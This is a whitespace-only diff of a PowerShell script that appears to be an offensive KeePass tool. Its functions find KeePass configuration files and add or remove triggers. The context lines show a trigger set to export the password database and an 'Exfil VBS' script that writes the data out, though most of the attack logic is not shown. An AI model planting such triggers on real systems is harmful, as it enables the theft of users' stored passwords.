@@ -14,7 +14,7 @@ function Find-KeePassconfig {
     .DESCRIPTION
 
         This function searches for any KeePass.config.xml (KeePass 2.X) and KeePass.ini (1.X) files in C:\Users\
-        and C:\Program Files[x86]\ by default, or any path specified by -Path. For any files found, it will 
+        and C:\Program Files[x86]\ by default, or any path specified by -Path. For any files found, it will
         parse the XML and output information relevant to the database location and keyfile/user master key information.
 
     .PARAMETER Path
@@ -408,7 +408,7 @@ function Get-KeePassConfigTrigger {
                 $KeePassXMLPath = Resolve-Path -Path $KeePassXMLPath
 
                 $KeePassXML = ([xml](Get-Content -Path $KeePassXMLPath)).InnerXml
-                
+
                 $EventGUIDs.Keys | Foreach-Object {
                     $KeePassXML = $KeePassXML.Replace($_, $EventGUIDs[$_])
                 }
@@ -420,7 +420,7 @@ function Get-KeePassConfigTrigger {
                 $KeePassXML = [xml]$KeePassXML
 
                 $Triggers = $KeePassXML.SelectNodes('Configuration/Application/TriggerSystem/Triggers')
-                
+
                 $Triggers | Select-Object -Expand Trigger -ErrorAction SilentlyContinue | ForEach-Object {
                     $_.PSObject.TypeNames.Insert(0, 'KeePass.Trigger')
                     $_ | Add-Member Noteproperty 'KeePassConfigPath' $KeePassXMLPath.Path
@@ -461,7 +461,7 @@ function Add-KeePassConfigTrigger {
     .PARAMETER ExportPath
 
         The path to export data and/or the $TriggerName.vbs to.
-    
+
     .PARAMETER TriggerName
 
         The name for the trigger, default to 'Debug'.
@@ -544,7 +544,7 @@ function Add-KeePassConfigTrigger {
     </Actions>
 </Trigger>
 "@
-            
+
             Write-Verbose "KeePass XML set to export database to $ExportPath"
         }
         else {
@@ -569,7 +569,7 @@ Next
 objFile.Write vbCrLf
 objFile.Close
 "@
-            
+
             $ExfilVBS | Out-File -Encoding ASCII -FilePath $ExfilVBSLocation
             Write-Verbose "Exfil VBS output to $ExfilVBSLocation set to export data to $ExportPath\$($TriggerName).txt"
 
@@ -627,7 +627,7 @@ objFile.Close
                 $KeePassXMLPath = Resolve-Path -Path $KeePassXMLPath
 
                 $KeePassXML = [xml](Get-Content -Path $KeePassXMLPath)
-                
+
                 $RandomGUID = [System.GUID]::NewGuid().ToByteArray()
 
                 if ($KeePassXML.Configuration.Application.TriggerSystem.Triggers -is [String]) {
@@ -677,7 +677,7 @@ function Remove-KeePassConfigTrigger {
     .PARAMETER ExportPath
 
         The path to export data and/or the $TriggerName.vbs to.
-    
+
     .PARAMETER TriggerName
 
         The name for the trigger, default to 'Debug'.
@@ -712,9 +712,9 @@ function Remove-KeePassConfigTrigger {
     )
 
     PROCESS {
-        
+
         ForEach($Object in $Path) {
-            
+
             if($Object -is [String]) {
                 $KeePassXMLPath = $Object
             }
@@ -730,14 +730,14 @@ function Remove-KeePassConfigTrigger {
             else {
                 $KeePassXMLPath = [String]$Object
             }
-            
+
             Write-Verbose "KeePassXMLPath: $KeePassXMLPath"
 
             if($KeePassXMLPath -and ($KeePassXMLPath -match '.\.xml$') -and (Test-Path -Path $KeePassXMLPath) ) {
                 $KeePassXMLPath = Resolve-Path -Path $KeePassXMLPath
 
                 $KeePassXML = [xml](Get-Content -Path $KeePassXMLPath)
-                
+
                 $RandomGUID = [System.GUID]::NewGuid().ToByteArray()
 
                 if ($KeePassXML.Configuration.Application.TriggerSystem.Triggers -isnot [String]) {
@@ -755,7 +755,7 @@ function Remove-KeePassConfigTrigger {
                 catch {
                     Write-Warning "Error setting path $KeePassXMLPath : $_"
                 }
-                
+
             }
         }
     }
